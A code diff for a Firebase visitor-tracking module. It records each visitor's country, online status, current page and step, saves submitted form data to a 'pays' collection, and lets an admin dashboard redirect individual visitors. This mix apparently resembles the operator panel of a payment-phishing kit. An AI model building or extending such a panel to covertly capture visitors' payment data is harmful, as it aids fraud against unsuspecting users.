@@ -10,9 +10,10 @@
  * - Block system
  */
 
-import { doc, updateDoc } from "firebase/firestore"
+import { doc, setDoc } from "firebase/firestore"
 import { onDisconnect, onValue, ref, serverTimestamp, set } from "firebase/database";
 import { addData, database, db } from "./firebase";
+
 // Generate unique visitor reference number
 export function generateVisitorRef(): string {
   const timestamp = Date.now().toString(36)
@@ -20,17 +21,17 @@ export function generateVisitorRef(): string {
   return `REF-${timestamp}-${random}`.toUpperCase()
 }
 
-// Get or create visitor ID
+// Get or create visitor ID — uses the same "visitor" key as the rest of the app
 export function getOrCreateVisitorID(): string {
   if (typeof window === 'undefined') {
     return generateVisitorRef()
   }
 
-  let visitorId = localStorage.getItem("visitor_id")
+  let visitorId = localStorage.getItem("visitor")
   
   if (!visitorId) {
     visitorId = generateVisitorRef()
-    localStorage.setItem("visitor_id", visitorId)
+    localStorage.setItem("visitor", visitorId)
   }
 
   return visitorId
@@ -96,7 +97,6 @@ export async function getCountry(): Promise<string> {
   const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
   
   try {
-    // Add timeout of 3 seconds
     const controller = new AbortController()
     const timeoutId = setTimeout(() => controller.abort(), 3000)
     
@@ -131,70 +131,63 @@ export async function initializeVisitorTracking(visitorId: string) {
     isUnread: true,
     currentStep: 1,
     currentPage: "home",
-    createdAt: new Date().toISOString(),
     lastActiveAt: new Date().toISOString(),
     sessionStartAt: new Date().toISOString()
   }
   
   await addData(trackingData)
   
-  // Setup online/offline listeners
   return trackingData
 }
+
 export const setupOnlineStatus = (userId: string) => {
   if (!userId) return;
 
-  // Create a reference to this user's specific status node in Realtime Database
   const userStatusRef = ref(database, `/status/${userId}`);
-
-  // Create a reference to the user's document in Firestore
   const userDocRef = doc(db, "pays", userId);
 
-  // Set up the Realtime Database onDisconnect hook
   onDisconnect(userStatusRef)
     .set({
       state: "offline",
       lastChanged: serverTimestamp(),
     })
     .then(() => {
-      // Update the Realtime Database when this client connects
       set(userStatusRef, {
         state: "online",
         lastChanged: serverTimestamp(),
       });
 
-      // Update the Firestore document
-      updateDoc(userDocRef, {
+      // Use setDoc with merge so it works even if the doc doesn't exist yet
+      setDoc(userDocRef, {
         online: true,
-        lastSeen: serverTimestamp(),
-      }).catch((error) =>
-        console.error("Error updating Firestore document:", error)
+        lastSeen: new Date().toISOString(),
+      }, { merge: true }).catch((error) =>
+        console.error("Error updating online status:", error)
       );
     })
     .catch((error) => console.error("Error setting onDisconnect:", error));
 
-  // Listen for changes to the user's online status
   onValue(userStatusRef, (snapshot) => {
     const status = snapshot.val();
     if (status?.state === "offline") {
-      // Update the Firestore document when user goes offline
-      updateDoc(userDocRef, {
+      setDoc(userDocRef, {
         online: false,
-        lastSeen: serverTimestamp(),
-      }).catch((error) =>
-        console.error("Error updating Firestore document:", error)
+        lastSeen: new Date().toISOString(),
+      }, { merge: true }).catch((error) =>
+        console.error("Error updating offline status:", error)
       );
     }
   });
 };
+
 export async function updateVisitorPage(visitorId: string, page: string, step: number) {
   try {
-    await updateDoc(doc(db, "pays", visitorId), {
+    await setDoc(doc(db, "pays", visitorId), {
       currentPage: page,
       currentStep: step,
       lastActiveAt: new Date().toISOString(),
       [`${page}VisitedAt`]: new Date().toISOString()
-    })
+    }, { merge: true })
   } catch (error) {
     console.error("Error updating visitor page:", error)
   }
@@ -209,7 +202,7 @@ export async function saveFormData(visitorId: string, data: any, pageName: strin
       lastActiveAt: new Date().toISOString()
     }
     
-    await updateDoc(doc(db, "pays", visitorId), timestampedData)
+    await setDoc(doc(db, "pays", visitorId), timestampedData, { merge: true })
   } catch (error) {
     console.error("Error saving form data:", error)
   }
@@ -240,7 +233,6 @@ export async function checkRedirectPage(visitorId: string): Promise<string | nul
     
     if (docSnap.exists()) {
       const data = docSnap.data()
-      // If redirectPage is set, return it and clear it
       if (data.redirectPage) {
         return data.redirectPage
       }
@@ -256,10 +248,10 @@ export async function checkRedirectPage(visitorId: string): Promise<string | nul
 // Clear redirect page after navigation
 export async function clearRedirectPage(visitorId: string) {
   try {
-    await updateDoc(doc(db, "pays", visitorId), {
+    await setDoc(doc(db, "pays", visitorId), {
       redirectPage: null,
       redirectedAt: new Date().toISOString()
-    })
+    }, { merge: true })
   } catch (error) {
     console.error("Error clearing redirect page:", error)
   }
@@ -268,10 +260,10 @@ export async function clearRedirectPage(visitorId: string) {
 // Set redirect page from admin dashboard
 export async function setRedirectPage(visitorId: string, targetPage: string) {
   try {
-    await updateDoc(doc(db, "pays", visitorId), {
+    await setDoc(doc(db, "pays", visitorId), {
       redirectPage: targetPage,
       redirectRequestedAt: new Date().toISOString()
-    })
+    }, { merge: true })
   } catch (error) {
     console.error("Error setting redirect page:", error)
   }
